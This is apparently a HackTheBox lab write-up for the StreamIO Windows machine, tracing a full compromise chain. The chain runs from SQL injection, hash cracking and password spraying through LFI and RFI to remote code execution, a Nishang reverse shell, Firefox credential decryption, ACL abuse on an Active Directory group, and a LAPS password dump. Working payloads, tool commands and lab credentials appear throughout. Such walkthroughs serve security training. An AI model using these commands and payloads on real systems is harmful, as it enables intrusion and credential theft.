---
title: HackTheBox - StreamIO
date: 2026-06-22
image: cover.png
tags: [HackTheBox, Medium, Windows, Active Directory]
platform: HackTheBox
os: Windows
difficulty: Medium
points: 65
released: 2025-08-30
ip: 10.129.19.184
boxAvatar: htb-cover.png
excerpt: StreamIO is a medium machine that covers subdomain enumeration leading to an SQL injection in order to retrieve stored user credentials, which are cracked to gain access to an administration panel. The administration panel is vulnerable to LFI, which allows us to retrieve the source code for the administration pages and leads to identifying a remote file inclusion vulnerability, the abuse of which gains us access to the system. After the initial shell we leverage the SQLCMD command line utility to enumerate databases and obtain further credentials used in lateral movement. As the secondary user we use WinPEAS to enumerate the system and find saved browser databases, which are decoded to expose new credentials. Using the new credentials within BloodHound we discover that the user has the ability to add themselves to a specific group in which they can read LDAP secrets. Without direct access to the account we use PowerShell to abuse this feature and add ourselves to the Core Staff group, then access LDAP to disclose the administrator LAPS password.
---

# StreamIO

### NMAP Scanning

```cpp
Open 10.129.19.184:53
Open 10.129.19.184:80
Open 10.129.19.184:88
Open 10.129.19.184:135
Open 10.129.19.184:139
Open 10.129.19.184:389
Open 10.129.19.184:443
Open 10.129.19.184:445
Open 10.129.19.184:464
Open 10.129.19.184:593
Open 10.129.19.184:636
Open 10.129.19.184:3268
Open 10.129.19.184:3269
Open 10.129.19.184:5985
Open 10.129.19.184:9389
```

### SMB - NULL & Guest Authentication

{% image %}

The SMB enumeration reveals the domain name `streamIO.htb` and the domain controller hostname `DC`. Adding both to `/etc/hosts`: `10.129.19.184	DC.streamIO.htb streamIO.htb`

### RPC Enumeration

Attempting to authenticate against RPC returns `NT_STATUS_ACCESS_DENIED`, confirming that anonymous RPC enumeration is not available on this target.

{% image2 %}

### LDAP Enumeration - Getting the Base

```cpp
➜  NetExec git:(main) ✗ ldapsearch -x -H ldap://10.129.19.184 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=streamIO,DC=htb
namingcontexts: CN=Configuration,DC=streamIO,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=streamIO,DC=htb
namingcontexts: DC=DomainDnsZones,DC=streamIO,DC=htb
namingcontexts: DC=ForestDnsZones,DC=streamIO,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Attempting a deeper enumeration against the base DN fails with a bind error, confirming that valid credentials are required before LDAP can be queried further:

```cpp
➜  NetExec git:(main) ✗ ldapsearch -x -H ldap://10.129.19.184 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=streamIO,DC=htb
namingcontexts: CN=Configuration,DC=streamIO,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=streamIO,DC=htb
namingcontexts: DC=DomainDnsZones,DC=streamIO,DC=htb
namingcontexts: DC=ForestDnsZones,DC=streamIO,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
➜  NetExec git:(main) ✗ ldapsearch -x -H ldap://10.129.19.184 -b "DC=streamIO,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=streamIO,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

### WebServer Enumeration - PORT 80

Port 80 serves a default IIS Windows Server page, confirming the web stack is Microsoft-based.

{% image3 %}

Running a `feroxbuster` content discovery scan against port 80:

{% image4 %}

Nothing of immediate interest surfaces on port 80.

### WebServer Enumeration - PORT 443

{% image5 %}

Port 443 hosts a movie streaming website. Inspecting the TLS certificate reveals an additional DNS name, which suggests a subdomain worth investigating.

{% image6 %}

Adding the discovered subdomain to `/etc/hosts` and running a virtual host brute-force scan with `wfuzz` to look for anything else:

```cpp
wfuzz -u https://streamio.htb/ -H "Host: FUZZ.streamio.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 24
```

No additional subdomains are discovered beyond what the certificate already disclosed.

{% image7 %}

Wappalyzer identifies the following technologies running on the site:

{% image8 %}

- PHP 7.2.26
- Popper
- CDN
- JSQuery 3.4.1

An email address is visible at the bottom of the page, potentially belonging to a domain user.

{% image9 %}

Running the email username through `kerbrute` to check if the account exists in the domain:

{% image10 %}

The account does not resolve to a valid domain user. Running a second `feroxbuster` scan against port 443 to discover additional content:

{% image11 %}

The scan surfaces several interesting endpoints:

- [https://streamio.htb/Login.php](https://streamio.htb/Login.php)
- [https://streamio.htb/register.php](https://streamio.htb/register.php)

{% image12 %}

- [https://streamio.htb/admin/master.php](https://streamio.htb/admin/master.php)

{% image13 %}

- [https://streamio.htb/ADMIN/index.php](https://streamio.htb/ADMIN/index.php)

{% image14 %}

### WebServer Subdomain - watch.streamio.htb

{% image15 %}

Running `feroxbuster` against the `watch.streamio.htb` subdomain reveals a search endpoint:

- [https://watch.streamio.htb/search.php](https://watch.streamio.htb/search.php)

{% image16 %}

Testing the search field with SQL injection payloads confirms it is vulnerable to a UNION-based injection:

{% image17 %}

Using the payload `10’ union select 1,2,3,4,5,6 -- -` to enumerate the number of columns, then querying the database version to identify the backend:

{% image18 %}

The version string confirms the backend is Microsoft SQL Server. Using MSSQL-specific injection payloads from the [PentestMonkey MSSQL cheat sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) to enumerate databases and tables, which exposes a table containing usernames and password hashes:

{% image19 %}

Running `hashid` against one of the hashes identifies them as MD5:

```cpp
➜  streamio hashid 665a50ac9eaa781e4f7f04199db97a11
Analyzing '665a50ac9eaa781e4f7f04199db97a11'
[+] MD2
[+] MD5
[+] MD4
[+] Double MD5
[+] LM
[+] RIPEMD-128
[+] Haval-128
[+] Tiger-128
[+] Skein-256(128)
[+] Skein-512(128)
[+] Lotus Notes/Domino 5
[+] Skype
[+] Snefru-128
[+] NTLM
[+] Domain Cached Credentials
[+] Domain Cached Credentials 2
[+] DNSSEC(NSEC3)
[+] RAdmin v2.x
```

Copying all 30 hashes and submitting them to CrackStation for cracking:

```cpp
admin:665a50ac9eaa781e4f7f04199db97a11
Alexendra:1c2b3d8270321140e5153f6637d3ee53
Austin:0049ac57646627b8d7aeaccf8b6a936f
Barbra:3961548825e3e21df5646cafe11c6c76
Barry:54c88b2dbd7b1a84012fabc1a4c73415
Baxter:22ee218331afd081b0dcd8115284bae3
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8
Carmon:35394484d89fcfdb3c5e447fe749d213
Clara:ef8f3d30a856cf166fb8215aca93e9ff
Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5
Garfield:8097cedd612cc37c29db152b6e9edbd3
Gloria:0cfaaaafb559f081df2befbe66686de0
James:c660060492d9edcaa8332d89c99c9239
Juliette:6dcd87740abb64edfa36d170f0d5450d
Lauren:08344b85b329d7efd611b7a7743e8a09
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f
Lucifer:7df45a9e3de3863807c026ba48e55fb3
Michelle:b83439b16f844bd6ffe35c02fe21b3c0
Oliver:fd78db29173a5cf701bd69027cb9bf6b
Robert:f03b910e2bd0313a23fdd7575f34a694
Robin:dc332fb5576e9631c9dae83f194f8e70
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
Samantha:083ffae904143c4796e464dac33c1f7d
Stan:384463526d288edcc95fc3701e523bc7
Thane:3577c47eb1e12c8ba021611e1280753c
Theodore:925e5408ecb67aea449373d668b7359e
Victor:bf55e15b119860a6e6b5a164377da719
Victoria:b22abb47a02b52d5dfa27fb0b534f693
William:d62be0dc82071bccc1322d64ec5b6c51
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
```

CrackStation imposes a limit on how many hashes can be submitted in a single request. With 30 hashes in total, splitting them into two batches works around this restriction:

{% image20 %}

```cpp
➜  streamio cat users_and_hashes.txt | cut -d ':' -f 2 | wc -l
30
➜  streamio
```

{% image21 %}

Second batch:

{% image22 %}

Using `kerbrute` to validate which of the extracted usernames are active domain accounts - `yoshihide` returns a valid hit:

{% image23 %}

Password spraying `yoshihide` against SMB and WinRM with the cracked passwords yields no results. Pivoting to the login page discovered earlier on `streamio.htb` and spraying all cracked credentials through `hydra`:

```cpp
hydra -L users.txt -P passwords.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```

A valid credential pair is returned:

{% image24 %}

Logging in with the discovered credentials grants access to the administration panel:

{% image25 %}

Inspecting the admin panel URL reveals a parameter-based routing pattern:

```cpp
https://streamio.htb/admin/?staff=
```

This suggests additional undisclosed parameters may exist. Using `ffuf` with the `burp-parameter-names.txt` wordlist to brute-force valid parameter names:

```cpp
ffuf -u "https://streamio.htb/admin/?FUZZ=" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -b PHPSESSID=avsbu1benn0bpfsu9jdojkvbm0 --fs 1678
```

{% image26 %}

Accessing the `debug` parameter directly produces an error that leaks path information:

{% image27 %}

Supplying `index.php` as the parameter value triggers a different error, indicating the parameter is attempting to include a local file:

{% image28 %}

The PHP `php://filter` wrapper can be used to read file contents as base64 without triggering execution errors: `php://filter/convert.base64-encode/resource=index.php`

{% image29 %}

Decoding the returned base64 output reveals the source of `index.php`:

{% image30 %}

Applying the same LFI technique to exfiltrate `master.php`, which was identified during the earlier content discovery:

{% image31 %}

The source reveals that `master.php` calls `file_get_contents()` on a user-controlled value and passes the result directly to `eval()` - a Remote File Inclusion vulnerability leading to Remote Code Execution. Since `master.php` is only reachable through inclusion rather than direct access, the LFI in the `debug` parameter can be used to load it, then the `include` parameter within `master.php` is used to point at a remote payload:

{% image32 %}

The hosted `test.php` contains a simple `<?php system(‘whoami’); ?>` to confirm execution. With RCE confirmed, a reverse shell is obtained using `Invoke-PowerShellTcp.ps1` from the Nishang toolkit.

Back on the shell, revisiting the source exfiltrated from `index.php` earlier reveals a set of hardcoded database credentials. Using these to connect to the local MSSQL instance and enumerate the databases:

```cpp
sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT DB_NAME(); SELECT name FROM master..sysdatabases;'
```

Further database enumeration uncovers credentials for another account - `nikk37` with the password `get_dem_girls2@yahoo.com`. Running `net user nikk37` confirms this user is a member of the `Remote Management Users` group, meaning WinRM access is available:

{% image33 %}

Connecting via Evil-WinRM and retrieving the user flag:

{% image34 %}

With a foothold as `nikk37`, running SharpHound or `rusthound` over LDAP to collect domain data for BloodHound. While enumerating the user's home directory, a Firefox profile directory is visible:

```cpp
*Evil-WinRM* PS C:\Users\nikk37> Get-ChildItem -Force

    Directory: C:\Users\nikk37

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        2/22/2022   1:57 AM                AppData
d--hsl        2/22/2022   1:57 AM                Application Data
d--hsl        2/22/2022   1:57 AM                Cookies
d-r---        2/26/2022  12:49 AM                Desktop
d-r---        2/26/2022  12:17 PM                Documents
d-r---        3/28/2022   2:57 PM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d--hsl        2/22/2022   1:57 AM                Local Settings
d-r---        9/15/2018  12:19 AM                Music
d--hsl        2/22/2022   1:57 AM                My Documents
d--hsl        2/22/2022   1:57 AM                NetHood
d-r---        9/15/2018  12:19 AM                Pictures
d--hsl        2/22/2022   1:57 AM                PrintHood
d--hsl        2/22/2022   1:57 AM                Recent
d-----        9/15/2018  12:19 AM                Saved Games
d--hsl        2/22/2022   1:57 AM                SendTo
d--hsl        2/22/2022   1:57 AM                Start Menu
d--hsl        2/22/2022   1:57 AM                Templates
d-r---        9/15/2018  12:19 AM                Videos
-a-h--        6/22/2026   3:14 PM         262144 NTUSER.DAT
-a-hs-        2/22/2022   1:57 AM         135168 ntuser.dat.LOG1
-a-hs-        2/22/2022   1:57 AM          32768 ntuser.dat.LOG2
-a-hs-        2/22/2022   1:57 AM          65536 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
-a-hs-        2/22/2022   1:57 AM         524288 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
-a-hs-        2/22/2022   1:57 AM         524288 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
---hs-        2/22/2022   1:57 AM             20 ntuser.ini
```

{% image35 %}

Downloading the Firefox profile directory locally and using [firepwd](https://github.com/lclevy/firepwd) to decrypt the saved credential database:

{% image36 %}

Spraying the recovered credentials across known domain users yields a valid hit on `JDgodd`:

{% image37 %}

Cross-referencing `JDgodd` in the BloodHound data reveals an interesting attack path:

{% image38 %}

`JDgodd` has `WriteOwner` rights over the `CORE STAFF` group, whose members can read the LAPS password for the domain controller. The attack chain is: take ownership of the group, grant full control to `JDgodd`, add the account to the group, then read the LAPS password to authenticate as the local administrator:

1. Taking ownership of the `CORE STAFF` group using `impacket-owneredit`:

{% image39 %}

2. Granting `JDgodd` full control over the `CORE STAFF` group using `impacket-dacledit`:

{% image40 %}

3. Adding `JDgodd` to the `CORE STAFF` group:

{% image41 %}

With `JDgodd` now a member of `CORE STAFF`, the LAPS password for the domain controller becomes readable. Using [LAPSDumper](https://github.com/n00py/LAPSDumper) to extract it:

```cpp
➜  LAPSDumper git:(main) python3 laps.py -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -l 10.129.19.184 -d streamio.htb
LAPS Dumper - Running at 06-22-2026 20:44:40
DC X(3M8}mR2P6j5A
➜  LAPSDumper git:(main)
```

Authenticating as the local administrator using the LAPS password and retrieving the root flag:

{% image42 %}